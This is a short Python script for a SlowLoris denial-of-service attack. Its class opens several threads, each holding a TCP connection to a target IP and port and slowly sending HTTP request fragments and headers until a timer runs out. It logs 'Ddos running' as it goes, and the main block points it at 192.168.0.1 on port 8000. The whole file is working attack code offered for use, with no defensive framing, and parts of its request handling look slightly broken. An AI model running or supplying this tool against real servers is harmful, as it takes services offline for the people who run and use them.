import socket
import threading
import time

from time import sleep

class SlowLoris:
    def __init__(self, target_ip : str, request = None , target_port=80, attack_time=1000000.0, num_threads=10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.epoch_termination = time.time() + float(attack_time) #epoch time that you want to terminate attack
        self.num_threads = num_threads
        if request == None:
            self.request = (f'GET /? HTTP/1.1\r\nHost:{self.target_ip}\\users.html').encode()
        else:
            self.request = request.rstrip('\r\n\r\n').encode()
        self.terminate = False

    def thread(self):
        regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]
        try:
            target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target.connect((self.target_ip, self.target_port))
            target.settimeout(None)
            while time.time() <= self.epoch_termination:
                target.send(self.request)
                for header in regular_headers:
                    target.send(header.encode())
                sleep(1)
            target.close()
        except Exception as e:
            print('[!] thread error: %s' % e)
            

    def attack(self):
        for x in range(self.num_threads):
            thread = threading.Thread(target = self.thread)
            thread.start()
            sleep(0.1)
            print('[+] began thread %s' % str(x))
        try:
            while time.time() <= self.epoch_termination:
                print('[*] Ddos running...')
                sleep(5)
        except KeyboardInterrupt:
            print('[*] terminating Ddos attack...')
            self.epoch_termination = 0

if __name__ == '__main__':
    ddos = SlowLoris('192.168.0.1', attack_time=1000, num_threads=10, target_port=8000)
    ddos.attack()
